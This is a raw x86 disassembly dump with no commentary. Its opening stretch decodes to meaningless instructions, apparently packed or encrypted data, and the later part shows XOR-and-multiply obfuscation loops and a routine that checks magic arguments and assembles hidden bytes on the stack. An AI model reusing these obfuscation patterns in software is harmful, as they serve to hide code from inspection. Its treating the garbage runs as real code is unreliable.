  41196b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41196c:	jp     0x411984
  41196e:	jno    0x41196f
  411970:	inc    edi
  411971:	mov    WORD PTR [edx+0x3aec8330],?
  411977:	xchg   ebx,eax
  411978:	loope  0x411980
  41197a:	bound  esi,QWORD PTR [esi+0x72e2eca8]
  411980:	cli    
  411981:	inc    esp
  411982:	punpckldq mm4,DWORD PTR [edi+0x639122b2]
  411989:	push   ds
  41198a:	mov    ebp,0x4c4e066
  41198f:	mov    BYTE PTR [esi],cl
  411991:	xchg   BYTE PTR [ebx+0x3a7eaac],bh
  411997:	pop    esi
  411998:	loop   0x411920
  41199a:	mov    esi,0x8d7309e7
  41199f:	xchg   DWORD PTR [esi+0xf],eax
  4119a2:	and    edi,edx
  4119a4:	mov    eax,ds:0xf12113e5
  4119a9:	pop    edx
  4119aa:	aam    0xb0
  4119ac:	add    DWORD PTR [ebx-0x41e222c],esi
  4119b2:	jnp    0x4119c1
  4119b4:	inc    edi
  4119b5:	cmp    bh,0xfb
  4119b8:	or     DWORD PTR fs:[ebx+0x6035f356],0x486d8bf1
  4119c3:	push   ebp
  4119c4:	fs and eax,0xae32af7c
  4119ca:	(bad)  
  4119cb:	out    dx,eax
  4119cc:	daa    
  4119cd:	adc    bl,ch
  4119cf:	or     al,0x2d
  4119d1:	fistp  WORD PTR [ebx-0x5515bbae]
  4119d7:	iret   
  4119d8:	or     BYTE PTR [ecx+0x6e8f083a],al
  4119de:	ret    0x4013
  4119e1:	stc    
  4119e2:	sub    edx,DWORD PTR [ebx+esi*4-0x12b4df0f]
  4119e9:	jo     0x411a69
  4119eb:	fiadd  WORD PTR ds:0x402d8c99
  4119f1:	and    al,0xf9
  4119f3:	mov    ch,0x72
  4119f5:	rcr    DWORD PTR [edx+0x66],cl
  4119f8:	dec    ecx
  4119f9:	ins    BYTE PTR es:[edi],dx
  4119fa:	dec    ecx
  4119fb:	and    edi,DWORD PTR [esi-0x3e]
  4119fe:	imul   ebp,DWORD PTR [ebx+0x35],0x4b58edad
  411a05:	mov    al,0x6c
  411a07:	dec    eax
  411a08:	sbb    eax,0xaba53b31
  411a0d:	adc    esi,DWORD PTR [edi+0xc4d237d]
  411a13:	pop    edx
  411a14:	rcl    cl,1
  411a16:	js     0x411a01
  411a18:	cmp    al,0x6f
  411a1a:	aad    0xa5
  411a1c:	jmp    0xd37f:0x579a79df
  411a23:	into   
  411a24:	into   
  411a25:	clc    
  411a26:	scas   eax,DWORD PTR es:[edi]
  411a27:	adc    BYTE PTR [ebx],0x8a
  411a2a:	add    BYTE PTR [ecx],bl
  411a2c:	popf   
  411a2d:	and    ax,0x136e
  411a31:	shl    BYTE PTR [esi],0x76
  411a34:	xchg   esp,eax
  411a35:	sub    eax,0xfb2c96c9
  411a3a:	jo     0x411a3c
  411a3c:	push   cs
  411a3d:	arpl   WORD PTR ds:0xdc6b2c9f,bp
  411a43:	jne    0x411a13
  411a45:	test   DWORD PTR [edx+0x1f],edi
  411a48:	and    DWORD PTR [eax-0x8],esp
  411a4b:	pop    ss
  411a4c:	inc    esp
  411a4d:	mov    al,ds:0x801bfc45
  411a52:	pop    ss
  411a53:	std    
  411a54:	mov    ds:0xac6398f4,eax
  411a59:	lea    ebx,[ebx+0x39]
  411a5c:	shl    BYTE PTR [eax-0x20],0x85
  411a60:	dec    esp
  411a61:	(bad)  
  411a62:	pop    ss
  411a63:	pcmpeqb mm3,mm4
  411a66:	xor    eax,0xbadfec18
  411a6b:	sub    eax,0xf041b5
  411a70:	nop
  411a71:	jae    0x411a68
  411a73:	aaa    
  411a74:	mov    al,ds:0x946b40c
  411a79:	sahf   
  411a7a:	inc    ecx
  411a7b:	or     ah,dl
  411a7d:	or     edx,0x9282a484
  411a83:	add    BYTE PTR [esi-0x61fa0725],cl
  411a89:	in     al,dx
  411a8a:	dec    esp
  411a8b:	add    bl,al
  411a8d:	mov    eax,ds:0x837d2915
  411a92:	bound  ebp,QWORD PTR [ebp-0x25d335ce]
  411a98:	mov    ah,BYTE PTR [esi+0x60dd0fa5]
  411a9e:	and    bl,BYTE PTR [ebx+0x36c0d85f]
  411aa4:	mov    esp,0x2861e345
  411aa9:	sbb    ebx,ecx
  411aab:	push   ebx
  411aac:	outs   dx,DWORD PTR ds:[esi]
  411aad:	push   ds
  411aae:	bsf    esp,DWORD PTR [eax-0x61]
  411ab2:	popf   
  411ab3:	inc    ebp
  411ab4:	jns    0x411aee
  411ab6:	mov    edx,0x94c2e2ab
  411abb:	jge    0x411a52
  411abd:	js     0x411ae7
  411abf:	jns    0x411a55
  411ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ac2:	test   eax,0x2fce37a
  411ac7:	fsub   DWORD PTR [esp+ebx*1+0x1d]
  411acb:	popa   
  411acc:	iret   
  411acd:	sbb    BYTE PTR [ecx+0x1c],dl
  411ad0:	mov    edi,0xe4e03746
  411ad5:	in     al,0x47
  411ad7:	sbb    BYTE PTR [esp+ebp*1-0x2],dh
  411adb:	mov    BYTE PTR [ebx-0x43],ah
  411ade:	loope  0x411abd
  411ae0:	inc    ebx
  411ae1:	sbb    eax,0x78c668f6
  411ae6:	das    
  411ae7:	test   al,0xc1
  411ae9:	mov    WORD PTR [edi-0x5921daac],fs
  411aef:	xor    BYTE PTR [eax-0x6f001080],0x4f
  411af6:	sahf   
  411af7:	inc    ecx
  411af8:	add    DWORD PTR [edx],esp
  411afa:	xor    BYTE PTR [edi+0x25],0x8
  411afe:	bound  edi,QWORD PTR ds:0x277ad9e0
  411b04:	in     eax,dx
  411b05:	xchg   edx,eax
  411b06:	add    eax,0xefdcc6c0
  411b0b:	push   ebx
  411b0c:	gs pop ds
  411b0e:	mov    bh,0x6
  411b10:	xchg   BYTE PTR [edx-0x32],bh
  411b13:	mov    cl,0xdf
  411b15:	inc    edx
  411b16:	fld    QWORD PTR [esi+0x3e38589a]
  411b1c:	sti    
  411b1d:	dec    ebx
  411b1e:	in     al,dx
  411b1f:	push   0x27c7d7cf
  411b24:	xor    al,0x23
  411b26:	out    0x8a,al
  411b28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b29:	jnp    0x411abc
  411b2b:	out    0x69,al
  411b2d:	xor    eax,0xea98aa8b
  411b32:	scas   al,BYTE PTR es:[edi]
  411b33:	test   BYTE PTR [ebx],al
  411b35:	dec    ebx
  411b36:	repz je 0x411b9b
  411b39:	mov    WORD PTR [edx+0x3a],cs
  411b3c:	div    BYTE PTR [eax-0x7d770b2b]
  411b42:	scas   al,BYTE PTR es:[edi]
  411b43:	xchg   ebx,eax
  411b44:	jb     0x411b85
  411b46:	mov    esi,0x859a712
  411b4b:	inc    eax
  411b4c:	or     DWORD PTR [esi],edx
  411b4e:	adc    dh,BYTE PTR [edx]
  411b50:	fistp  WORD PTR [ebx+0x544a3ddd]
  411b56:	call   0x4dcd:0x51f719e8
  411b5d:	inc    esi
  411b5e:	call   0xb4a83921
  411b63:	(bad)  [esi]
  411b65:	loop   0x411b5b
  411b67:	xchg   ebx,eax
  411b68:	inc    ebp
  411b69:	pop    ebp
  411b6a:	fmul   QWORD PTR [edx-0x79]
  411b6d:	repnz mov ecx,0x5eb578d8
  411b73:	xchg   BYTE PTR [ecx+0x32],ch
  411b76:	test   BYTE PTR [edi],al
  411b78:	mov    bl,0xad
  411b7a:	adc    BYTE PTR [esi-0x74],ah
  411b7d:	shl    DWORD PTR [ecx+0x6826a891],1
  411b83:	stos   DWORD PTR es:[edi],eax
  411b84:	xor    al,0xdc
  411b86:	test   al,0x44
  411b88:	aad    0x3e
  411b8a:	fwait
  411b8b:	out    0xc0,eax
  411b8d:	fsubr  DWORD PTR [edx+0x25]
  411b90:	sahf   
  411b91:	cmp    al,0x2c
  411b94:	inc    esp
  411b95:	jbe    0x411b75
  411b97:	hlt    
  411b98:	sahf   
  411b99:	cld    
  411b9a:	iret   
  411b9b:	pop    ds
  411b9c:	xlat   BYTE PTR ds:[ebx]
  411b9d:	pop    es
  411b9e:	scas   al,BYTE PTR es:[edi]
  411b9f:	add    edx,DWORD PTR [edi]
  411ba1:	jp     0x411ba4
  411ba3:	mov    ch,ch
  411ba5:	dec    eax
  411ba6:	lahf   
  411ba7:	xor    eax,0x1585c00d
  411bac:	in     eax,0x97
  411bae:	arpl   WORD PTR [ebp-0x6e],bx
  411bb1:	mov    cl,0x58
  411bb3:	sti    
  411bb4:	dec    esi
  411bb5:	rol    DWORD PTR [edi+edx*1-0x3],cl
  411bb9:	jge    0x411c13
  411bbb:	sub    bl,BYTE PTR [edi]
  411bbd:	push   ebx
  411bbe:	mov    WORD PTR [edi+0x6f],?
  411bc1:	ret    0x9ae
  411bc4:	jnp    0x411bee
  411bc6:	inc    ecx
  411bc7:	adc    eax,0x72842eab
  411bcc:	es sbb eax,0x48678b71
  411bd2:	lds    edx,FWORD PTR [ebx]
  411bd4:	mov    bl,0x10
  411bd6:	jo     0x411c2f
  411bd8:	outs   dx,DWORD PTR ds:[esi]
  411bd9:	xchg   ebp,eax
  411bda:	push   ecx
  411bdb:	fld    DWORD PTR [ebx+0x10]
  411bde:	(bad)  [edi-0xe]
  411be1:	retf   0x9b8
  411be4:	xchg   ebp,eax
  411be5:	daa    
  411be6:	dec    edi
  411be7:	or     al,0xef
  411be9:	cli    
  411bea:	ss movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  411bed:	cmp    eax,0x23487c1e
  411bf2:	enter  0xfb42,0xbe
  411bf6:	mov    ah,0x73
  411bf8:	call   FWORD PTR [ecx+0x6ae3de94]
  411bfe:	dec    ecx
  411bff:	mov    ah,0x77
  411c01:	outs   dx,BYTE PTR ds:[esi]
  411c02:	repnz xchg edi,eax
  411c04:	push   esi
  411c05:	push   0xfffffff4
  411c07:	push   DWORD PTR [edx+0x13]
  411c0a:	push   eax
  411c0b:	pushf  
  411c0c:	div    ecx
  411c0e:	popa   
  411c0f:	add    DWORD PTR [edx-0x58a6cfee],edi
  411c15:	sub    edx,edi
  411c17:	xor    edx,DWORD PTR [ebp-0x6dd25859]
  411c1d:	ja     0x411c52
  411c1f:	cmc    
  411c20:	in     eax,0x9a
  411c22:	mov    ebx,0x33d9df70
  411c27:	arpl   si,sp
  411c29:	test   BYTE PTR [esi],ch
  411c2b:	retf   0x225b
  411c2e:	hlt    
  411c2f:	jp     0x411c32
  411c31:	and    edi,DWORD PTR [esi-0x2cf68908]
  411c37:	sbb    cl,BYTE PTR [esi]
  411c39:	iret   
  411c3a:	and    bl,BYTE PTR [ebx+0x2e4e7247]
  411c40:	mov    ch,0xe1
  411c42:	outs   dx,DWORD PTR ds:[esi]
  411c43:	xor    eax,0x29d11b2c
  411c48:	outs   dx,BYTE PTR ds:[esi]
  411c49:	cli    
  411c4a:	ret    
  411c4b:	mov    cs,edi
  411c4d:	aaa    
  411c4e:	mov    ebx,0xe9cb3093
  411c53:	fistp  QWORD PTR [eax-0x5d]
  411c56:	lock mov esi,0x8bd121da
  411c5c:	jae    0x411cb1
  411c5e:	pop    ss
  411c5f:	imul   eax,DWORD PTR [ecx],0xec8d0e89
  411c65:	push   ebp
  411c66:	inc    ebx
  411c67:	icebp  
  411c68:	call   0xa91f65f7
  411c6d:	mov    ecx,0xe6dfb71d
  411c72:	inc    eax
  411c73:	mov    ebp,DWORD PTR [ebx+0x76547106]
  411c79:	lods   eax,DWORD PTR ds:[esi]
  411c7a:	mov    eax,ds:0x81d9a335
  411c7f:	stos   BYTE PTR es:[edi],al
  411c80:	sbb    al,0x77
  411c82:	fisubr DWORD PTR [eax+0x12]
  411c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c86:	cmp    eax,0xb0509e9c
  411c8b:	jg     0x411c3a
  411c8d:	sahf   
  411c8e:	shl    DWORD PTR [edi+0x6f],cl
  411c91:	jne    0x411cb3
  411c93:	std    
  411c94:	jl     0x411c77
  411c96:	pushf  
  411c97:	in     al,dx
  411c98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c99:	or     cl,BYTE PTR [edx+ebx*1-0x18]
  411c9d:	and    esp,DWORD PTR [ebx]
  411c9f:	sub    eax,0x2eaeb4d9
  411ca4:	repnz repnz push 0xffffff9d
  411ca8:	push   edx
  411ca9:	mov    bh,bl
  411cab:	adc    BYTE PTR ss:[ebp+0x79da0193],ah
  411cb2:	bound  ebx,QWORD PTR [eax-0x625abaa3]
  411cb8:	jg     0x411cd1
  411cba:	dec    ebx
  411cbb:	out    0x44,al
  411cbd:	imul   ecx,DWORD PTR [ebx],0xffffff96
  411cc0:	sub    cl,0x81
  411cc3:	aam    0xf6
  411cc5:	mov    bl,0xf
  411cc7:	aaa    
  411cc8:	inc    esi
  411cc9:	ins    BYTE PTR es:[edi],dx
  411cca:	imul   edi,DWORD PTR [esi],0xe14e58af
  411cd0:	adc    esp,DWORD PTR [edx+0x18]
  411cd3:	sbb    BYTE PTR [eax+0x48],cl
  411cd6:	adc    eax,0xa04213b3
  411cdb:	jecxz  0x411cc0
  411cdd:	or     al,0x73
  411cdf:	std    
  411ce0:	or     edi,DWORD PTR [eax]
  411ce2:	cdq    
  411ce3:	shl    BYTE PTR [ebx+0x6c],0xda
  411ce7:	xor    al,0x55
  411ce9:	daa    
  411cea:	dec    ebx
  411ceb:	mov    ecx,0x3d1e9506
  411cf0:	or     eax,0xac084e91
  411cf5:	dec    esi
  411cf6:	or     BYTE PTR [edi+0x1531676],al
  411cfc:	sub    eax,0xbf9da4ea
  411d01:	(bad)  
  411d02:	cld    
  411d03:	out    dx,al
  411d04:	inc    ebx
  411d05:	sub    al,0x23
  411d07:	test   BYTE PTR [edx+eiz*4],al
  411d0a:	add    DWORD PTR cs:[edx+0x59d0cfab],0x3f
  411d12:	push   edx
  411d13:	addr16 pop edi
  411d15:	sbb    DWORD PTR [edx+0x4e],edi
  411d18:	mul    DWORD PTR [eax]
  411d1a:	push   edi
  411d1b:	pop    ebp
  411d1c:	into   
  411d1d:	jmp    FWORD PTR [edi]
  411d1f:	shl    DWORD PTR [esi],cl
  411d21:	push   ds
  411d22:	push   esp
  411d23:	mov    al,0xaf
  411d25:	mov    cl,0xf0
  411d27:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  411d29:	mov    ah,0x64
  411d2b:	cwde   
  411d2c:	adc    DWORD PTR [ebp+ebp*8+0x280de6a0],ebp
  411d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d34:	mov    WORD PTR ss:[ebp-0x3b],cs
  411d38:	mov    bl,0x39
  411d3a:	mov    al,0x49
  411d3c:	mov    ebp,0x16297da5
  411d42:	retf   
  411d43:	xor    DWORD PTR [ebx],ebx
  411d45:	sbb    eax,0xa0e69f24
  411d4a:	push   ecx
  411d4b:	in     eax,0xe8
  411d4d:	pop    edx
  411d4e:	mov    al,0x3a
  411d50:	scas   eax,DWORD PTR es:[edi]
  411d51:	xor    eax,0x9b2cf2c8
  411d56:	cmp    ecx,esi
  411d58:	sbb    cl,bh
  411d5a:	inc    edx
  411d5b:	outs   dx,DWORD PTR ds:[esi]
  411d5c:	arpl   WORD PTR [eax-0x5f688ce],bp
  411d62:	pop    edx
  411d63:	loopne 0x411d7e
  411d65:	icebp  
  411d66:	cli    
  411d67:	mov    bl,0xf0
  411d69:	mov    ecx,0xe0beb562
  411d6e:	out    dx,eax
  411d6f:	mov    ah,0x66
  411d71:	enter  0x7668,0xe2
  411d75:	jno    0x411ddc
  411d77:	std    
  411d78:	fs test dl,bl
  411d7b:	jmp    0x411dc2
  411d7d:	sti    
  411d7e:	fwait
  411d7f:	pop    eax
  411d80:	xor    edx,DWORD PTR [ebp-0x21]
  411d83:	and    DWORD PTR [eax+0xe],esi
  411d86:	pushf  
  411d87:	and    cl,BYTE PTR [esi-0x4b]
  411d8a:	icebp  
  411d8b:	inc    ecx
  411d8c:	jg     0x411df0
  411d8e:	fdiv   DWORD PTR [eax]
  411d90:	dec    ebp
  411d91:	jne    0xda18f46f
  411d97:	loop   0x411e0d
  411d99:	in     al,dx
  411d9a:	ins    DWORD PTR es:[edi],dx
  411d9b:	sub    edx,DWORD PTR [edi-0xd61cd0c]
  411da1:	cmp    ecx,edx
  411da3:	jb     0x40f9d0
  411da9:	jmp    0x411df3
  411dae:	mov    ecx,DWORD PTR [ebp-0xc]
  411db1:	mov    DWORD PTR [ebp+0x8],ecx
  411db4:	jmp    0x411de6
  411db9:	mov    ecx,DWORD PTR [ebp+0x8]
  411dbc:	mov    edx,DWORD PTR [ebp-0x8]
  411dbf:	xor    ecx,eax
  411dc1:	xor    edx,eax
  411dc3:	sub    ecx,edx
  411dc5:	sub    ecx,esi
  411dc7:	xor    ecx,eax
  411dc9:	mov    DWORD PTR [ebp+0x8],ecx
  411dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  411dcf:	mov    edx,DWORD PTR [ebp+0x8]
  411dd2:	imul   edx,edx,0x5708f2
  411dd8:	xor    ecx,eax
  411dda:	add    ecx,esi
  411ddc:	lea    ecx,[ebp+ecx*4-0x64]
  411de0:	mov    edi,DWORD PTR [ecx]
  411de2:	add    edx,edi
  411de4:	mov    DWORD PTR [ecx],edx
  411de6:	mov    ecx,DWORD PTR [ebp+0x8]
  411de9:	xor    ecx,eax
  411deb:	add    ecx,esi
  411ded:	jne    0x411db9
  411df3:	mov    ecx,DWORD PTR [ebp-0xc]
  411df6:	mov    DWORD PTR [ebp+0x8],ecx
  411df9:	jmp    0x411e2b
  411dfe:	mov    ecx,DWORD PTR [ebp+0x8]
  411e01:	mov    edx,DWORD PTR [ebp-0x8]
  411e04:	xor    ecx,eax
  411e06:	xor    edx,eax
  411e08:	sub    ecx,edx
  411e0a:	sub    ecx,esi
  411e0c:	xor    ecx,eax
  411e0e:	mov    DWORD PTR [ebp+0x8],ecx
  411e11:	mov    ecx,DWORD PTR [ebp+0x8]
  411e14:	mov    edx,DWORD PTR [ebp+0x8]
  411e17:	imul   edx,edx,0x5708f2
  411e1d:	xor    ecx,eax
  411e1f:	add    ecx,esi
  411e21:	lea    ecx,[ebp+ecx*4-0x64]
  411e25:	mov    edi,DWORD PTR [ecx]
  411e27:	add    edx,edi
  411e29:	mov    DWORD PTR [ecx],edx
  411e2b:	mov    ecx,DWORD PTR [ebp+0x8]
  411e2e:	xor    ecx,eax
  411e30:	add    ecx,esi
  411e32:	jne    0x411dfe
  411e38:	mov    ecx,DWORD PTR [ebp-0x8]
  411e3b:	mov    edx,DWORD PTR [ebp-0x20]
  411e3e:	xor    ecx,eax
  411e40:	lea    ecx,[ecx+edx*1+0x3272dd]
  411e47:	mov    DWORD PTR [ebp-0x20],ecx
  411e4a:	inc    DWORD PTR [ebp+0xc]
  411e4d:	mov    ecx,DWORD PTR [ebp-0x1c]
  411e50:	xor    ecx,eax
  411e52:	add    ecx,esi
  411e54:	jne    0x40f7af
  411e5a:	jmp    0x411ee3
  411e5f:	mov    ecx,DWORD PTR [ebp-0xc]
  411e62:	mov    DWORD PTR [ebp+0x8],ecx
  411e65:	jmp    0x411e97
  411e6a:	mov    ecx,DWORD PTR [ebp+0x8]
  411e6d:	mov    edx,DWORD PTR [ebp-0x8]
  411e70:	xor    ecx,eax
  411e72:	xor    edx,eax
  411e74:	sub    ecx,edx
  411e76:	sub    ecx,esi
  411e78:	xor    ecx,eax
  411e7a:	mov    DWORD PTR [ebp+0x8],ecx
  411e7d:	mov    ecx,DWORD PTR [ebp+0x8]
  411e80:	mov    edx,DWORD PTR [ebp+0x8]
  411e83:	imul   edx,edx,0x5708f2
  411e89:	xor    ecx,eax
  411e8b:	add    ecx,esi
  411e8d:	lea    ecx,[ebp+ecx*4-0x64]
  411e91:	mov    edi,DWORD PTR [ecx]
  411e93:	add    edx,edi
  411e95:	mov    DWORD PTR [ecx],edx
  411e97:	mov    ecx,DWORD PTR [ebp+0x8]
  411e9a:	xor    ecx,eax
  411e9c:	add    ecx,esi
  411e9e:	jne    0x411e6a
  411ea4:	jmp    0x411eef
  411ea9:	mov    ecx,DWORD PTR [ebp+0x8]
  411eac:	mov    edx,DWORD PTR [ebp-0x8]
  411eaf:	xor    ecx,eax
  411eb1:	xor    edx,eax
  411eb3:	sub    ecx,edx
  411eb5:	sub    ecx,esi
  411eb7:	xor    ecx,eax
  411eb9:	mov    DWORD PTR [ebp+0x8],ecx
  411ebc:	mov    ecx,DWORD PTR [ebp+0x8]
  411ebf:	mov    edx,DWORD PTR [ebp+0x8]
  411ec2:	xor    ecx,eax
  411ec4:	imul   edx,edx,0x5708f2
  411eca:	add    ecx,esi
  411ecc:	lea    ecx,[ebp+ecx*4-0x64]
  411ed0:	mov    edi,DWORD PTR [ecx]
  411ed2:	add    edx,edi
  411ed4:	mov    DWORD PTR [ecx],edx
  411ed6:	mov    ecx,DWORD PTR [ebp+0x8]
  411ed9:	xor    ecx,eax
  411edb:	add    ecx,esi
  411edd:	jne    0x411ea9
  411ee3:	mov    ecx,DWORD PTR [ebp-0x8]
  411ee6:	xor    ecx,eax
  411ee8:	mov    eax,DWORD PTR [ebp+0x10]
  411eeb:	add    ecx,esi
  411eed:	mov    DWORD PTR [eax],ecx
  411eef:	pop    edi
  411ef0:	pop    esi
  411ef1:	pop    ebx
  411ef2:	leave  
  411ef3:	ret    0xc
	...
  411f02:	add    BYTE PTR [eax],al
  411f04:	pop    esi
  411f05:	mov    eax,0x4dd0
  411f0a:	add    BYTE PTR [eax],al
  411f0c:	xor    bl,BYTE PTR [edi]
  411f0e:	add    DWORD PTR [eax],eax
  411f10:	add    DWORD PTR [eax],eax
  411f12:	add    BYTE PTR [eax],al
  411f14:	add    DWORD PTR [eax],eax
  411f16:	add    BYTE PTR [eax],al
  411f18:	add    DWORD PTR [eax],eax
  411f1a:	add    BYTE PTR [eax],al
  411f1c:	sub    BYTE PTR [edi],bl
  411f1e:	add    DWORD PTR [eax],eax
  411f20:	sub    al,0x1f
  411f22:	add    DWORD PTR [eax],eax
  411f24:	xor    BYTE PTR [edi],bl
  411f26:	add    DWORD PTR [eax],eax
  411f28:	test   eax,0x3e000029
  411f2d:	pop    ds
  411f2e:	add    DWORD PTR [eax],eax
  411f30:	add    BYTE PTR [eax],al
  411f32:	push   ebx
  411f33:	jns    0x411fa2
  411f35:	bound  ebp,QWORD PTR [edi+0x6c]
  411f38:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  411f3f:	inc    ebx
  411f40:	ins    BYTE PTR es:[edi],dx
  411f41:	outs   dx,DWORD PTR ds:[esi]
  411f42:	jae    0x411fa9
  411f44:	push   edi
  411f45:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  411f4c:	popa   
  411f4d:	je     0x411fb8
  411f4f:	outs   dx,DWORD PTR ds:[esi]
  411f50:	outs   dx,BYTE PTR ds:[esi]
  411f51:	inc    ebx
  411f52:	ins    BYTE PTR es:[edi],dx
  411f53:	outs   dx,DWORD PTR ds:[esi]
  411f54:	jae    0x411fbb
  411f56:	push   edi
  411f57:	imul   eax,DWORD PTR [eax],0x40042a0
  411f5d:	mov    al,ds:0xa0080042
  411f62:	inc    edx
  411f63:	add    BYTE PTR [eax+eiz*4],cl
  411f66:	inc    edx
  411f67:	add    BYTE PTR [eax],dl
  411f69:	mov    al,ds:0xa0140042
  411f6e:	inc    edx
  411f6f:	add    BYTE PTR [eax],bl
  411f71:	mov    al,ds:0xa01c0042
  411f76:	inc    edx
  411f77:	add    BYTE PTR [eax],al
  411f79:	rol    BYTE PTR [edx+0x0],1
  411f7c:	add    al,0xd0
  411f7e:	inc    edx
  411f7f:	add    BYTE PTR [eax],cl
  411f81:	rol    BYTE PTR [edx+0x0],1
  411f84:	or     al,0xd0
  411f86:	inc    edx
  411f87:	add    BYTE PTR [eax],dl
  411f89:	rol    BYTE PTR [edx+0x0],1
  411f8c:	adc    al,0xd0
  411f8e:	inc    edx
  411f8f:	add    BYTE PTR [eax],bl
  411f91:	rol    BYTE PTR [edx+0x0],1
  411f94:	sbb    al,0xd0
  411f96:	inc    edx
	...
  411fa3:	add    BYTE PTR [esi-0x48],bl
  411fa6:	ror    BYTE PTR [ebp+0x0],1
  411fa9:	add    BYTE PTR [eax],al
  411fab:	add    BYTE PTR [edx],al
  411fad:	add    BYTE PTR [eax],al
  411faf:	add    BYTE PTR ds:0x30000000,bh
  411fb5:	and    BYTE PTR [ecx],al
  411fb7:	add    BYTE PTR [eax],dh
  411fb9:	adc    al,0x1
  411fbb:	add    BYTE PTR [eax],al
  411fbd:	nop
  411fbe:	inc    edx
  411fbf:	add    BYTE PTR [eax+edx*4],al
  411fc2:	inc    edx
  411fc3:	add    BYTE PTR [eax],cl
  411fc5:	nop
  411fc6:	inc    edx
  411fc7:	add    BYTE PTR [eax+edx*4],cl
  411fca:	inc    edx
  411fcb:	add    BYTE PTR [eax],dl
  411fcd:	nop
  411fce:	inc    edx
  411fcf:	add    BYTE PTR [eax+edx*4],dl
  411fd2:	inc    edx
  411fd3:	add    BYTE PTR [eax],bl
  411fd5:	nop
  411fd6:	inc    edx
  411fd7:	add    BYTE PTR [eax+edx*4],bl
  411fda:	inc    edx
  411fdb:	add    BYTE PTR [eax],ah
  411fdd:	nop
  411fde:	inc    edx
  411fdf:	add    BYTE PTR [eax+edx*4],ah
  411fe2:	inc    edx
  411fe3:	add    BYTE PTR [eax],ch
  411fe5:	nop
  411fe6:	inc    edx
  411fe7:	add    BYTE PTR [eax],al
  411fe9:	mov    al,0x42
  411feb:	add    BYTE PTR [eax+esi*4],al
  411fee:	inc    edx
  411fef:	add    BYTE PTR [eax],cl
  411ff1:	mov    al,0x42
  411ff3:	add    BYTE PTR [eax+esi*4],cl
  411ff6:	inc    edx
  411ff7:	add    BYTE PTR [eax],dl
  411ff9:	mov    al,0x42
  411ffb:	add    BYTE PTR [eax+esi*4],dl
  411ffe:	inc    edx
  411fff:	add    BYTE PTR [eax],bl
  412001:	mov    al,0x42
  412003:	add    BYTE PTR [eax+esi*4],bl
  412006:	inc    edx
  412007:	add    BYTE PTR [eax],al
  412009:	rol    BYTE PTR [edx+0x0],0x4
  41200d:	rol    BYTE PTR [edx+0x0],0x8
  412011:	rol    BYTE PTR [edx+0x0],0xc
  412015:	rol    BYTE PTR [edx+0x0],0x10
  412019:	rol    BYTE PTR [edx+0x0],0x14
  41201d:	rol    BYTE PTR [edx+0x0],0x18
  412021:	rol    BYTE PTR [edx+0x0],0x1c
  412025:	rol    BYTE PTR [edx+0x0],0x0
  412029:	add    BYTE PTR [eax],al
  41202b:	add    BYTE PTR [eax],al
  41202d:	add    BYTE PTR [eax],al
  41202f:	add    BYTE PTR [edx+0x53],dl
  412032:	inc    esp
  412033:	push   ebx
  412034:	sbb    cl,BYTE PTR [ebp-0x61a73578]
  41203a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41203b:	inc    ebx
  41203c:	call   0x8c4e:0x824ec88
  412043:	stos   DWORD PTR es:[edi],eax
  412044:	add    DWORD PTR [eax],eax
  412046:	add    BYTE PTR [eax],al
  412048:	inc    ebx
  412049:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41204d:	jb     0x4120c1
  41204f:	outs   dx,BYTE PTR gs:[esi]
  412051:	je     0x412097
  412053:	popa   
  412054:	je     0x4120b7
  412056:	pop    esp
  412057:	dec    ebp
  412058:	outs   dx,DWORD PTR ds:[esi]
  412059:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  412061:	ins    BYTE PTR es:[edi],dx
  412062:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  412069:	dec    esi
  41206a:	gs ja  0x41206d
  41206d:	mov    edx,DWORD PTR [ebp-0x14]
  412070:	sub    esp,0xe4
  412076:	push   ebx
  412077:	mov    eax,ebx
  412079:	xchg   ecx,eax
  41207a:	mov    eax,DWORD PTR [ebp+0x8]
  41207d:	cmp    eax,0xf89c85b5
  412082:	jne    0x412416
  412088:	mov    eax,DWORD PTR [ebp+0xc]
  41208b:	cmp    eax,0xf89c85b2
  412090:	jne    0x412416
  412096:	mov    eax,DWORD PTR [ebp+0x24]
  412099:	mov    DWORD PTR [ebp-0x4],eax
  41209c:	mov    BYTE PTR [ebp-0x18],0x3
  4120a0:	mov    BYTE PTR [ebp-0x17],0x1e
  4120a4:	mov    BYTE PTR [ebp-0x16],0x5
  4120a8:	mov    BYTE PTR [ebp-0x15],0x4f
  4120ac:	mov    BYTE PTR [ebp-0x14],0x4c
  4120b0:	mov    BYTE PTR [ebp-0x13],0x7a
  4120b4:	mov    BYTE PTR [ebp-0x20],0xf1
  4120b8:	mov    BYTE PTR [ebp-0x1f],0xf
  4120bc:	mov    BYTE PTR [ebp-0x1e],0x1
  4120c0:	mov    BYTE PTR [ebp-0x1d],0xc
  4120c4:	mov    BYTE PTR [ebp-0x1c],0x4f
  4120c8:	mov    BYTE PTR [ebp-0x1b],0x4c
  4120cc:	mov    BYTE PTR [ebp-0x1a],0x7a
  4120d0:	mov    BYTE PTR [ebp-0x28],0xf
  4120d4:	mov    BYTE PTR [ebp-0x27],0x2
  4120d8:	push   esi
  4120d9:	mov    BYTE PTR [ebp-0x26],0x6
  4120dd:	mov    BYTE PTR [ebp-0x25],0xf3
  4120e1:	push   edi
  4120e2:	mov    BYTE PTR [ebp-0x24],0x1d
  4120e6:	mov    BYTE PTR [ebp-0x23],0xa
  4120ea:	push   0x71
  4120ec:	mov    BYTE PTR [ebp-0x22],0x5
  4120f0:	xor    edi,edi
  4120f2:	mov    BYTE PTR [ebp-0x21],0x7a
  4120f6:	xor    esi,esi
  4120f8:	pop    edx
  4120f9:	mov    eax,0xf5
  4120fe:	lea    ecx,[ebp+esi*1-0x18]
  412102:	movzx  ebx,BYTE PTR [ecx]
